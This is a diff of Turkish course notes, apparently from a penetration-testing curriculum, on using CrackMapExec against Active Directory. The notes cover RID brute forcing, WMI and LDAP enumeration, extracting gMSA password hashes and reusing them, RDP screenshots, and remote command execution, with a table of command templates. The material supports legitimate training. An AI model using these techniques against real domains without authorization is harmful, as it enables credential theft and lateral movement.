-![Pasted image 20241202204115.png](/img/user/resimler/Pasted%20image%2020241202204115.png)
-![Pasted image 20241202204130.png](/img/user/resimler/Pasted%20image%2020241202204130.png)
-![Pasted image 20241202204141.png](/img/user/resimler/Pasted%20image%2020241202204141.png)
-![Pasted image 20241202204153.png](/img/user/resimler/Pasted%20image%2020241202204153.png)
-![Pasted image 20241202204200.png](/img/user/resimler/Pasted%20image%2020241202204200.png)
+{{CODE_BLOCK_130}}
 
-Varsayılan olarak, --rid-brute 4000'e kadar RID'leri zorlayarak nesneleri numaralandırır. Davranışını --rid-brute [MAX_RID] kullanarak değiştirebiliriz.
+Varsayılan olarak, `--rid-brute 4000`'e kadar RID'leri zorlayarak objeleri numaralandırır. Davranışını `--rid-brute [MAX_RID]` kullanarak değiştirebiliriz.
 
-rid-brute seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory nesnelerini almak için kullanılabilir. NULL Authentication etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
-
+`--rid-brute` seçeneği, brute ile zorlanan kimliklerle eşleşen kullanıcı adlarını ve diğer Active Directory objeleri almak için kullanılabilir. `NULL Authentication` etkinleştirilmişse domain hesaplarını numaralandırmak için de kullanılabilir. Bu seçeneğin bu şekillerde kullanılabileceğini unutmamak önemlidir.
 
 ### Enumerate Disks
 
-Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir --disks seçeneğine sahiptir.
+Bazen kontrol etmeyi hatırlamamız gereken önemli bir parça, bir sunucuda bulunabilecek ek disklerdir. CrackMapExec, sunucuda var olan diskleri kontrol etmemizi sağlayan bir `--disks` seçeneğine sahiptir.
 
 ### Enumerating Disks
-![Pasted image 20241202204448.png](/img/user/resimler/Pasted%20image%2020241202204448.png)
+
+{{CODE_BLOCK_131}}
 
 
 ### Local ve Domain Gruplarını Numaralandırma
-Local-groups ile local grupları veya --groups ile domain gruplarını listeleyebiliriz.
+
+Local-groups ile local grupları veya `--groups` ile domain gruplarını listeleyebiliriz.
 
 ### Enumerating Local Groups
-![Pasted image 20241202204607.png](/img/user/resimler/Pasted%20image%2020241202204607.png)
-![Pasted image 20241202204629.png](/img/user/resimler/Pasted%20image%2020241202204629.png)
 
+{{CODE_BLOCK_132}}
 
 ### Enumerating Domain Groups
-![Pasted image 20241202204749.png](/img/user/resimler/Pasted%20image%2020241202204749.png)
-![Pasted image 20241202204830.png](/img/user/resimler/Pasted%20image%2020241202204830.png)
 
-Eğer grup üyelerini almak istiyorsak, --groups [GRUP ADI] kullanabiliriz.
+{{CODE_BLOCK_133}}
+
+
+Eğer grup üyelerini almak istiyorsak, `--groups [GRUP ADI]` kullanabiliriz.
 
 
 ### Group **Members**
-![Pasted image 20241202204931.png](/img/user/resimler/Pasted%20image%2020241202204931.png)
 
-Not: Yazım sırasında --local-group yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
+{{CODE_BLOCK_134}}
+
+Not: Yazım sırasında `--local-group` yalnızca bir Domain Controller'a karşı çalışır ve grup adını kullanarak bir grubu sorgulamak işe yaramaz.
 
 
-### Querying WMI
-[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde yönetimsel işlemler için kullanılır. Remote bilgisayarlardaki yönetim görevlerini otomatikleştirmek için WMI komut dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
+### WMI Sorgulama
 
-Windows Yönetim Araçları'nın (WMI) birincil kullanım alanlarından biri, sınıf ve örnek bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm nesneleri döndürmesini isteyebiliriz.
+[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI), Windows işletim sistemlerinde administrative işlemler için kullanılır. Remote bilgisayarlardaki administrative görevlerini otomatikleştirmek için WMI script dosyaları veya uygulamaları yazabiliriz. WMI, işletim sisteminin diğer bölümlerine ve System Center Operations Manager (eski adıyla Microsoft Operations Manager (MOM)) veya Windows Remote Management (WinRM) gibi ürünlere yönetim verileri sağlar.
 
-WMI, TCP port 135 ve bir dizi dinamik port kullanır: 49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri), TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+Windows Management Instrumentation'nın (WMI) birincil kullanım alanlarından biri, sınıf (class) ve örnek (instance) bilgileri için WMI havuzunu sorgulama yeteneğidir. Örneğin, WMI'dan remote veya local bir sistemden shut-down olaylarını temsil eden tüm objeleri döndürmesini isteyebiliriz.
 
-Örneğin, remote bir bilgisayarda Sysmon uygulamasının çalışıp çalışmadığını sorgulamak ve Caption ve ProcessId'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu SELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%' şeklindedir:
+WMI, TCP port `135` ve bir dizi dinamik port kullanır: `49152-65535 (RPC dinamik portları - Windows Vista, 2008 ve üzeri)`, TCP 1024-65535 (RPC dinamik portları - Windows NT4, Windows 2000, Windows 2003) veya WMI'yı özel bir port aralığı kullanacak şekilde ayarlayabiliriz
+
+Örneğin, remote bir bilgisayarda `Sysmon` uygulamasının çalışıp çalışmadığını sorgulamak ve `Caption` ve `ProcessId`'yi görüntülemek için WMI kullanalım, kullanacağımız WMI sorgusu S`ELECT Caption,ProcessId FROM Win32_Process WHERE Caption LIKE '%sysmon%'` şeklindedir:
 
 
 ### Sysmon'un Çalışıp Çalışmadığını Sorgulamak için WMI Kullanma
-![Pasted image 20241202210123.png](/img/user/resimler/Pasted%20image%2020241202210123.png)
 
-WMI, sınıflarını hiyerarşik bir ad alanında düzenler. Bir sorgu gerçekleştirmek için, Class Name (Sınıf Adı) ve içinde bulunduğu Namespace'i (Ad Alanı) bilmemiz gerekir. Yukarıdaki örnekte, root\cimv2 namespace'indeki Win32_Process sınıfını sorgulayın. Namespace belirtmedik çünkü varsayılan olarak CME root\cimv2 kullanır (bu bilgiyi --help menüsünde görebiliriz)
+{{CODE_BLOCK_135}}
 
-Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, root\WMI namespace'inde bulunan MSPower_DeviceEnable sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
+WMI, sınıflarını hiyerarşik bir namespace içinde düzenler. Bir sorgu gerçekleştirmek için, Class Name ve bulunduğu Namespace'i bilmemiz gerekir. Yukarıdaki örnekte, `Win32_Process` sınıfını `root\cimv2` namespace'inde sorguluyoruz. Namespace'i belirtmedik çünkü varsayılan olarak CME, `root\cimv2`'yi kullanır (bu bilgiyi --help menüsünde görebiliriz).
+
+Başka bir namespace'i sorgulamak için onu belirtmemiz gerekir. Örneğin, `root\WMI` namespace'inde bulunan `MSPower_DeviceEnable` sınıfını sorgulayalım. Bu sınıf, sistem çalışırken dinamik olarak açılıp kapanması gereken cihazlar hakkında bilgi tutar. Belirli bir konuyla ilgili WMI sınıflarının nasıl bulunacağı hakkında daha fazla bilgi edinmek için [Microsoft](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_wmi?view=powershell-5.1#finding-wmi-classes) ve [wutils.com'](https://wutils.com/wmi/)daki 3. taraf belgelerini kullanabiliriz.
 
 
 ### Quering root\WMI Namespace
-![Pasted image 20241202212300.png](/img/user/resimler/Pasted%20image%2020241202212300.png)
-![Pasted image 20241202212343.png](/img/user/resimler/Pasted%20image%2020241202212343.png)
 
-Not: Genellikle, WMI'yı sorgulamak için yönetici ayrıcalıklarına sahip olmamız gerekir, ancak bir yönetici, WMI'yı sorgulamak için yönetici olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için yönetici olmayan bir hesap kullanabiliriz.
+{{CODE_BLOCK_136}}
 
-WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için Microsoft'un Belgelerini okuyabiliriz.
+Not: Genellikle, WMI'yı sorgulamak için administrative ayrıcalıklarına sahip olmamız gerekir, ancak bir administrator, WMI'yı sorgulamak için administrator olmayan bir hesabı yapılandırabilir. Bu durumda, WMI sorgularını gerçekleştirmek için administrator olmayan bir hesap kullanabiliriz.
+
+WMI Sorgu Dili (WQL) hakkında daha fazla bilgi edinmek için [Microsoft'un Belgelerini](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wql-sql-for-wmi) okuyabiliriz.
+
+
 
 Aşağıdaki bölüm LDAP ve RDP protokollerini kullanarak numaralandırmayı kapsayacaktır.
 
+----
+
 
 ### LDAP and RDP Enumeration
-Daha önce, CrackMapExec'te en çok kullanılan protokol olan SMB ile bazı numaralandırma seçeneklerini inceledik, ancak LDAP ve RDP protokolleri ile daha fazla numaralandırma seçeneği vardır
+
+Daha önce, CrackMapExec'te en çok kullanılan protokol olan `SMB` ile bazı numaralandırma seçeneklerini inceledik, ancak `LDAP` ve `RDP` protokolleri ile daha fazla numaralandırma seçeneği vardır
 
 Bu bölümde, bu seçeneklerden bazıları ve hedeflerimizi nasıl daha fazla numaralandırabileceğimiz gösterilecektir
 
-
 ### LDAP & RDP Commands
+
 LDAP ve RDP protokolleri aşağıdaki seçenekleri içerir:
-![Pasted image 20241202225531.png](/img/user/resimler/Pasted%20image%2020241202225531.png)
-![Pasted image 20241202225542.png](/img/user/resimler/Pasted%20image%2020241202225542.png)
 
-Henüz çalışmadıklarımızı gözden geçirelim.
+| Komut                                                                          | Açıklama                                                                                           |
+| ------------------------------------------------------------------------------ | -------------------------------------------------------------------------------------------------- |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --users`                  | Etkin Domain kullanıcılarını listeler.                                                             |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --groups`                 | Domain gruplarını listeler.                                                                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --password-notrequired`   | `PASSWORD_NOTREQD` bayrağı olan kullanıcıları listeler.                                            |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --trusted-for-delegation` | `TRUSTED_FOR_DELEGATION` bayrağı olan kullanıcı ve bilgisyalarını listeler.                        |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --admin-count`            | `adminCount=1` derecesine sahip objeleri listeler.                                                 |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --get-sid`                | Domainin SID bilgisini alır.                                                                       |
+| `crackmapexec ldap <hedef> -u <kullanıcı> -p <şifre> --gmsa`                   | GMSA (Gruplandırılmış Yönetici Hizmet Hesapları) şifrelerini listeler.                             |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --nla-screenshot`          | NLA (Ağ Seviyesinde Kimlik Doğrulaması) devre dışı ise RDP giriş ekranının ekran görüntüsünü alır. |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screenshot`              | Bağlantı başarılıysa RDP oturumunun ekran görüntüsünü alır.                                        |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --screentime`              | Masaüstü görüntüsü için bekleme süresini belirtir.                                                 |
+| `crackmapexec rdp <hedef> -u <kullanıcı> -p <şifre> --res RES`                 | Çözünürlük belirler (örnek format: WIDTHxHEIGHT, varsayılan: 1024x768).                            |
 
+Henüz çalışmadıklarımız varsa onları gözden geçirelim.
 
 ### Enumerating Users and Groups
 
-SMB protokolünde yaptığımız gibi, LDAP ile de kullanıcıları ve grupları listeleyebiliriz:
+SMB protokolünde yaptığımız gibi, `LDAP` ile de kullanıcıları ve grupları listeleyebiliriz:
 
 ### Enumerating Users and Groups
 
-![Pasted image 20241202225710.png](/img/user/resimler/Pasted%20image%2020241202225710.png)
-![Pasted image 20241202225721.png](/img/user/resimler/Pasted%20image%2020241202225721.png)
-![Pasted image 20241202225733.png](/img/user/resimler/Pasted%20image%2020241202225733.png)
-![Pasted image 20241202225743.png](/img/user/resimler/Pasted%20image%2020241202225743.png)
+{{CODE_BLOCK_137}}
 
-Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi /etc/hosts dosyasında yapılandırmamız gerekir
+Not: Domain FQDN'sini çözümleyemezsek LDAP protokol iletişimlerinin çalışmayacağını unutmayın. Domain DNS sunucularına bağlanmıyorsak, FQDN'yi `/etc/hosts` dosyasında yapılandırmamız gerekir
 
 
 ### İlginç Hesap Özelliklerini Numaralandırma
 
-ldap protokolü, PASSWD_NOTREQD veya TRUSTED_FOR_DELEGATION bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta adminCount değeri 1 olan tüm hesapları sorgulayabiliriz.
+`ldap` protokolü, `PASSWD_NOTREQD` veya `TRUSTED_FOR_DELEGATION` bayrağı ile hesapları tanımlamamıza yardımcı olacak birkaç seçeneğe daha sahiptir ve hatta `adminCount` değeri `1` olan tüm hesapları sorgulayabiliriz.
 
-PASSWD_NOTREQD hesap denetimi özniteliği ayarlanmışsa, kullanıcı geçerli parola ilkesi uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir ( domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için --password-notrequired seçeneğini kullanabiliriz.
-
-
-### PASSWD_NOTREQD Özniteliğinin Tanımlanması
-
-![Pasted image 20241202230116.png](/img/user/resimler/Pasted%20image%2020241202230116.png)
-![Pasted image 20241202230124.png](/img/user/resimler/Pasted%20image%2020241202230124.png)
-
-TRUSTED_FOR_DELEGATION özniteliği ayarlanırsa, bir hizmetin altında çalıştığı hizmet hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani hizmeti talep eden bir istemciyi taklit edebilir. Bu saldırı türüne Kerberos Unconstrained Delegation adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
-
-### Kısıtlamasız Delegasyonun Belirlenmesi
-![Pasted image 20241202230729.png](/img/user/resimler/Pasted%20image%2020241202230729.png)
-
-adminCount özniteliği, SDProp işleminin bir kullanıcıyı koruyup korumadığını belirler. Bu işlemde, Active Directory'deki AdminSDHolder, korunan kullanıcı hesaplarının ACL izinleri için bir şablon görevi görür. Herhangi bir ACE hesabı değiştirilirse (örneğin, bir saldırgan tarafından), bu işlem tarafından korunan hesapların ACL izinleri, SDProp işlemi her çalıştığında şablon izin kümesine sıfırlanır; bu varsayılan olarak her 60 dakikada bir yapılır ancak değiştirilebilir. Değer 0 olarak ayarlanmışsa veya belirtilmemişse kullanıcı kapsam dışıdır. Öznitelik değeri 1 olarak ayarlanırsa kullanıcı korunur. Saldırganlar genellikle dahili bir ortamda hedef almak için adminCount özniteliği 1 olarak ayarlanmış hesapları ararlar. Bunlar genellikle ayrıcalıklı hesaplardır ve daha fazla erişime veya domain'in tamamen ele geçirilmesine yol açabilir.
+`PASSWD_NOTREQD` hesap denetimi attribute ayarlanmışsa, kullanıcı geçerli password policy uzunluğuna tabi değildir, yani daha kısa bir parolaya sahip olabilir veya hiç parola kullanmayabilir (domain'de boş parolalara izin veriliyorsa). Bu hesapları tanımlamak için  `--password-notrequired` seçeneğini kullanabiliriz.
 
 
-### adminCount Özniteliğini Sorgulama
-![Pasted image 20241202230901.png](/img/user/resimler/Pasted%20image%2020241202230901.png)
-![Pasted image 20241202230911.png](/img/user/resimler/Pasted%20image%2020241202230911.png)
-![Pasted image 20241202230921.png](/img/user/resimler/Pasted%20image%2020241202230921.png)
+### PASSWD_NOTREQD Attribute Tanımlanması
+
+{{CODE_BLOCK_138}}
+
+`TRUSTED_FOR_DELEGATION` attribute ayarlanırsa, bir servisin altında çalıştığı servis hesabı (kullanıcı veya bilgisayar) Kerberos yetkilendirmesi için güvenilirdir, yani servisi talep eden bir client'i taklit edebilir. Bu saldırı türüne `Kerberos Unconstrained Delegation` adı verilir. Bu konu hakkında daha fazla bilgi edinmek için bu [blog](https://adsecurity.org/?p=1667) yazısını okuyabilirsiniz.
+
+### Unconstrained Delegation Belirlenmesi
+
+{{CODE_BLOCK_139}}
+
+`AdminCount` attribute, SDProp process'in bir kullanıcıyı koruyup korumadığını belirler. Bu process'te, Active Directory'deki `AdminSDHolder`, korunan user account'lar için ACL permissions'ın bir template'i olarak görev yapar. Eğer herhangi bir account ACE'si (örneğin, bir attacker tarafından) modified edilirse, bu process tarafından korunan account'ların ACL permissions'ı, `SDProp` process her çalıştığında (default olarak her 60 dakikada bir çalışır, ancak bu süre modified edilebilir) templated permission set'e resetlenir. User, adminCount değeri 0 olarak set edilmişse veya specified değilse bu koruma kapsamına girmez. Eğer attribute value 1 olarak set edilmişse, user korunur. Attacker'lar genellikle internal environment'ta adminCount attribute'i 1 olan account'ları target olarak arar. Bunlar genellikle privileged account'lardır ve further access veya full domain compromise ile sonuçlanabilir.
+
+
+### adminCount Attribute'u Sorgulama
+
+{{CODE_BLOCK_140}}
 
 
 ### Domain SID'sini numaralandırma
 
-Bazı domain saldırıları, kullanıcı veya domain SID'si gibi belirli domain bilgilerini edinmemizi gerektirir. SID (Security IDentifier), bir bilgisayarın veya domain controller'ın sizi tanımlamak için kullandığı benzersiz bir kimlik numarasıdır. Domain sid, domain'i tanımlayan benzersiz bir kimlik numarasıdır. CrackMapExec kullanarak domain sid'sini almak için --get-sid bayrağını kullanabiliriz:
+Bazı domain attack'ları, bir user veya domain SID gibi belirli domain bilgilerini elde etmemizi gerektirir. SID (Security IDentifier), bir computer veya domain controller'ın sizi tanımlamak için kullandığı `unique bir ID` numarasıdır. Domain SID ise domain'i tanımlayan unique bir ID numarasıdır. CrackMapExec kullanarak domain SID'i elde etmek için `--get-sid` flag'ini kullanabiliriz:
 
+### Domain SID'i Toplama
 
-### Gathering the Domain SID
-
-![Pasted image 20241202231106.png](/img/user/resimler/Pasted%20image%2020241202231106.png)
-![Pasted image 20241202231112.png](/img/user/resimler/Pasted%20image%2020241202231112.png)
+{{CODE_BLOCK_141}}
 
 
 ### Group Managed Service Accounts (gMSA)
@@ -17591,138 +18654,158 @@ Bağımsız Yönetilen Hizmet Hesabı (standalone Managed Service Account) (sMSA
 * Basitleştirilmiş service principal name (SPN) yönetimi.
 * Yönetimi diğer yöneticilere devretme yeteneği
 
-Bu yönetilen hizmet hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
+Bu yönetilen servis hesabı (MSA) türü Windows Server 2008 R2 ve Windows 7'de tanıtılmıştır.
 
 Group Managed Service Account (gMSA) domain içinde aynı işlevselliği sağlar ancak aynı zamanda bu işlevselliği birden fazla sunucuya genişletir.
 
 Bir gMSA hesabının parolasını okuma ayrıcalıklarına sahip bir hesabı belirlemek için PowerShell'i kullanabiliriz (komut yürütmeyi bir sonraki bölümde daha ayrıntılı olarak ele alacağız):
 
-
 ### Enumerating Accounts with gMSA Privileges
-![Pasted image 20241202231402.png](/img/user/resimler/Pasted%20image%2020241202231402.png)
-![Pasted image 20241202231409.png](/img/user/resimler/Pasted%20image%2020241202231409.png)
 
-Yukarıdaki örnekte, engels kullanıcısının PrincipalsAllowedToRetrieveManagedPassword ayrıcalığına sahip olduğunu görebiliriz, bu da svc_inlaneadm$ gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın NTLM parola hash'ini almak için --gmsa seçeneğini kullanabiliriz.
+{{CODE_BLOCK_142}}
+
+
+Yukarıdaki örnekte, `engels` kullanıcısının `PrincipalsAllowedToRetrieveManagedPassword` ayrıcalığına sahip olduğunu görebiliriz, bu da `svc_inlaneadm$` gMSA hesabının parolasını okuyabileceği anlamına gelir. gMSA parolasını okuma hakkına sahip bir hesabı tehlikeye atarsak, hesabın `NTLM` parola hash'ini almak için `--gmsa` seçeneğini kullanabiliriz.
 
 
 ### gMSA Parolasını Edinme
-![Pasted image 20241202231528.png](/img/user/resimler/Pasted%20image%2020241202231528.png)
+
+{{CODE_BLOCK_143}}
 
 Bu kimlik bilgilerini kullanmak için, hash'ler için -H seçeneğini kullanabiliriz.
 
-
 ### svc_inlaneadm$ Hesabı ile Paylaşılan Klasörleri İnceleme
-![Pasted image 20241202231553.png](/img/user/resimler/Pasted%20image%2020241202231553.png)
-![Pasted image 20241202231601.png](/img/user/resimler/Pasted%20image%2020241202231601.png)
 
+{{CODE_BLOCK_144}}
+
+
+---
 
 ### RDP Screenshots
-RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca NLA ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için --nlascreenshot seçeneğini kullanabiliriz
+
+RDP protokolü aracılığıyla kullanıcı adlarını numaralandırmak için CrackMapExec'i kullanabiliriz. Hedef makinede RDP'ye yalnızca `NLA` ile izin verme seçeneği devre dışı bırakılmışsa, oturum açma isteminin ekran görüntüsünü almak için `--nlascreenshot` seçeneğini kullanabiliriz
 
 
 ### Enumerate Login Prompt
-![Pasted image 20241202231656.png](/img/user/resimler/Pasted%20image%2020241202231656.png)
+
+{{CODE_BLOCK_145}}
 
 Ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz.
 
 
-### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202231729.png](/img/user/resimler/Pasted%20image%2020241202231729.png)
+### Ekran Görüntüsünü Açmak için MATE'in Eye Kullanma
+
+{{CODE_BLOCK_146}}
+
 ![Pasted image 20241202231735.png](/img/user/resimler/Pasted%20image%2020241202231735.png)
 
-Eğer bir kullanıcı adı ve parolamız varsa, --screenshot seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek --screentime ile birleştirilebilir, varsayılan olarak 10, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
+Eğer bir kullanıcı adı ve parolamız varsa, `--screenshot` seçeneği ile RDP protokolünü kullanarak da ekran görüntüsü alabiliriz. Bu seçenek `--screentime` ile birleştirilebilir, varsayılan olarak `10`, RDP bağlantısı açıldıktan sonra ekran görüntüsü almak için bekleyeceği süredir. Bu, bir hedef makineye bağlandığımızda ve hedefin masaüstünü yüklemesi 10 saniyeden fazla sürdüğünde kullanışlıdır.
 
-Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen --res seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek 1024x768 olarak ayarlanmıştır
-
-
-
-### Taking a Screenshot
-![Pasted image 20241202232439.png](/img/user/resimler/Pasted%20image%2020241202232439.png)
-![Pasted image 20241202232444.png](/img/user/resimler/Pasted%20image%2020241202232444.png)
+Ekran görüntüsü seçeneğiyle birleştirilebilecek bir diğer seçenek de RDP bağlantısı sırasındaki ekran çözünürlüğüne karşılık gelen `--res` seçeneğidir. Bu seçenek yararlıdır çünkü aktif bir RDP oturumu bulursak, kullanıcının ekranının boyutuna bağlı olarak tüm içeriği görebiliriz veya göremeyiz. Varsayılan olarak bu seçenek `1024x768` olarak ayarlanmıştır
 
 
-Not: --screentime ve --res isteğe bağlı bayraklardır.
+### Screenshot Alma
+
+{{CODE_BLOCK_147}}
+
+
+Not: `--screentime` ve `--res` isteğe bağlı bayraklardır.
 
 Son olarak, ekran görüntüsünü açmak için MATE'in Eye'ını veya CLI'dan eom'u kullanabiliriz:
 
 
 ### Ekran Görüntüsünü Açmak için MATE'in Gözünü Kullanma
-![Pasted image 20241202232517.png](/img/user/resimler/Pasted%20image%2020241202232517.png)
+
+{{CODE_BLOCK_148}}
+
 ![Pasted image 20241202232523.png](/img/user/resimler/Pasted%20image%2020241202232523.png)
 
-
-Bu bölümde, hedeflerimizi arşivlemeye yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini araştırdık. Bir sonraki bölümde CrackMapExec kullanarak komutların nasıl çalıştırılacağı incelenecektir.
-
+Bu bölümde, hedeflerimize ulaşmamıza yardımcı olabilecek LDAP ve RDP kullanarak çeşitli numaralandırma seçeneklerini inceledik. Aşağıdaki bölüm, CrackMapExec kullanarak komutların nasıl çalıştırılacağını gözden geçirecektir.
 
 
-
+---
 
 ### Command Execution
 
-Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce UAC'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca RID 500'e sahip yönetici hesabı (varsayılan yönetici) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
+Remote target üzerinde local administrator olarak bir komut çalıştırmaya çalışmadan önce `UAC`'nin varlığını kontrol etmeliyiz. UAC etkinleştirildiğinde, ki bu varsayılan durumdur, yalnızca `RID 500`'e sahip administrator hesabı (varsayılan administrator) remote komutları yürütebilir. Durumun böyle olup olmadığını kontrol etmek için iki registry key vardır:
 
-![Pasted image 20241203095807.png](/img/user/resimler/Pasted%20image%2020241203095807.png)
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`
+`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`
 
-Varsayılan olarak, LocalAccountTokenFilterPolicy değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) yönetim görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si 500 ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm yönetici hesapları yönetim görevlerini yürütebilir.
+Varsayılan olarak, `LocalAccountTokenFilterPolicy` değeri 0 olarak ayarlanmıştır, yani yalnızca built-in administrator hesabı (RID 500) administration görevlerini gerçekleştirebilir. Local administrator grubunda olsak bile, yalnızca kullanıcımızın RID'si `500` ise remote komutları çalıştırabiliriz. Değer 1 olarak ayarlanırsa tüm administrative hesapları yönetim görevlerini yürütebilir.
 
-Yöneticinin yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) uzaktan yönetim görevlerini yerine getirmesini engellemektir. Bu, FilterAdministratorToken kayıt defteri değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (uzaktan yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
+Administrator yapılandırabileceği bir diğer ayar da local administrator hesabının (RID 500) remote yönetim görevlerini yerine getirmesini engellemektir. Bu, `FilterAdministratorToken` registry değerini 1 olarak ayarlayarak yapılabilir; bu, built-in administrator hesabının (RID 500) remote administrative tasks (remote yönetim görevleri) gerçekleştiremeyeceği anlamına gelir.
 
 
+### Administrator Olarak Komut Yürütme
 
-### Command Execution as Administrator
-Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için -x seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
+Komutları çalıştırmak ve administrators grubuna kimlerin üye olduğunu görmek için Administrator hesabını kullanalım. Windows komut satırı komutlarını çalıştırmak için `-x` seçeneğini ve ardından çalıştırmak istediğimiz komutu kullanmamız gerekir.
 
 
 ### Bir Komutu Administrator Olarak Çalıştırma
-![Pasted image 20241203100035.png](/img/user/resimler/Pasted%20image%2020241203100035.png)
-![Pasted image 20241203100045.png](/img/user/resimler/Pasted%20image%2020241203100045.png)
+
+{{CODE_BLOCK_149}}
 
 
-### RID 500 Dışı Hesap Olarak Komut Yürütme
-Yukarıdaki komutta, localadmin local user Administrators grubundadır, ancak uzak komutu çalıştıramaz:
+### RID 500 Olmayan Hesap Olarak Komut Yürütme
+
+Yukarıdaki komutta, `localadmin` local user `Administrators` grubundadır, ancak remote komutu çalıştıramaz:
 
 ### Komutu localadmin olarak çalıştırma
-![Pasted image 20241203100238.png](/img/user/resimler/Pasted%20image%2020241203100238.png)
 
-Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap yönetici olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, LocalAccountTokenFilterPolicy'yi 1 olarak ayarlayabiliriz.
+{{CODE_BLOCK_150}}
+
+Bu, UAC'nin etkin olduğu anlamına gelir. Eğer durum böyleyse, hesap administrator olsa bile (Pwn3d!) mesajını almayacağız. Bu ayarı geri almak istiyorsak, `LocalAccountTokenFilterPolicy`'yi 1 olarak ayarlayabiliriz.
 
 
 ### LocalAccountTokenFilterPolicy'yi Değiştirme
